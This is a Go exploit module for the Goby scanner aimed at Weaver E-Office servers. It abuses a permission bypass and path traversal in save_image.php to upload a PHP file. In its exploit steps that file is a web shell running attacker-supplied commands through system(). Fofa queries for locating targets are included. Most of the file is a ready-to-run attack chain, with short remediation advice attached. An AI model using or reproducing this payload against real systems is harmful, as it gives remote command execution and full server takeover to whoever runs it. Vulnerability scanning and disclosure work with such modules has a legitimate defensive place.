package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office sample Bypass file image fileupload Vulnerability",
    "Description": "<p>E-office is a standard collaborative mobile office platform of Shanghai Weaver Network Technology Co., Ltd.</p><p>E-office has a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-10-31",
    "Author": "1243099890@qq.com",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Level": "3",
    "Impact": "<p>E-office has a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions</p>",
    "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sample.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "setcookie|lastheader|regex|Set-Cookie: PHPSESSID=(.*?); path=/"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/system/interface/theme_set/save_image.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymzrNfz1ehkVc9A3Z",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Cookie": "{{{setcookie}}}"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarymzrNfz1ehkVc9A3Z\nContent-Disposition: form-data; name=\"image_type\"\n\n../../clientTools\n------WebKitFormBoundarymzrNfz1ehkVc9A3Z\nContent-Disposition: form-data; name=\"upfile\"; filename=\"1.php\"\nContent-Type: image/jpeg\n\n<?php echo md5(233);unlink(__FILE__);?>\n------WebKitFormBoundarymzrNfz1ehkVc9A3Z\nContent-Disposition: form-data; name=\"theme_name\"\n\ntheme3\n------WebKitFormBoundarymzrNfz1ehkVc9A3Z--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/down.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filename|lastbody|regex|<tr class=TableLine1><td>(.*?)</td><td>"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/clientTools/{{{filename}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sample.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "测试页面",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "setcookie|lastbody|regex|Set-Cookie: PHPSESSID=(.*?); path=/"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/system/interface/theme_set/save_image.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymzrNfz1ehkVc9A3Z",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Cookie": "{{{setcookie}}}"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarymzrNfz1ehkVc9A3Z\nContent-Disposition: form-data; name=\"image_type\"\n\n../../clientTools\n------WebKitFormBoundarymzrNfz1ehkVc9A3Z\nContent-Disposition: form-data; name=\"upfile\"; filename=\"1.php\"\nContent-Type: image/jpeg\n\n<?php system($_POST[cmd]);unlink(__FILE__);?>\n------WebKitFormBoundarymzrNfz1ehkVc9A3Z\nContent-Disposition: form-data; name=\"theme_name\"\n\ntheme3\n------WebKitFormBoundarymzrNfz1ehkVc9A3Z--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/down.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filename|lastbody|regex|<tr class=TableLine1><td>(.*?)</td><td>"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/clientTools/{{{filename}}}",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "cmd={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "File Upload",
        "Permission Bypass"
    ],
    "VulType": [
        "File Upload",
        "Permission Bypass"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office sample 权限绕过 save image 文件上传漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>e-office是上海泛微网络科技股份有限公司一款标准协同移动办公平台。</p><p>e-office 存在权限绕过漏洞，攻击者可以绕过权限校验，上传<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">任意文件</span>获取服务器控制权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">e-office 存在权限绕过漏洞，攻击者可以绕过权限校验，上传</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">任意文件</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">获取服务器控制权限。</span><br></p>",
            "VulType": [
                "文件上传",
                "权限绕过"
            ],
            "Tags": [
                "文件上传",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office sample Bypass file image fileupload Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">E-office is a standard collaborative mobile office platform of Shanghai&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Weaver</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">&nbsp;Network Technology Co., Ltd.</span><br></p><p>E-office has <span style=\"color: rgb(0, 0, 0); font-size: 16px;\">a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions</span></p>",
            "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability:&nbsp;<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a><br></p><p>2. Set access policies and white list access through security devices such as firewalls.<br></p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>E-office has&nbsp;<span style=\"color: rgb(0, 0, 0);\">a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions</span><br></p>",
            "VulType": [
                "File Upload",
                "Permission Bypass"
            ],
            "Tags": [
                "File Upload",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
